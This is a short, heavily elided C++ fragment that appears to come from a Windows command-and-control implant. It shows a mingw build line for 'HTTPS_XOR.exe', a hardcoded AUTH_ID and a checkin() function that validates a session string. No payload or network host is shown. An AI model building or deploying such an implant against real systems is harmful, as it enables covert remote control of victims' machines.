// x86_64-w64-mingw32-g++ -o HTTPS_XOR.exe HTTPS_XOR.cpp -lwininet -lcrypt32 -lws2_32 -static -std=c++17 -lstdc++fs
...
string AUTH_ID = "3f0ed77d-f715-4ebc-9cdc-2902e14212a7";
...
bool checkin() {
    try {
        ...
        if (session_id.empty() || session_id.find("HTTPS - XOR - ") == string::npos) {
            return false;
        }
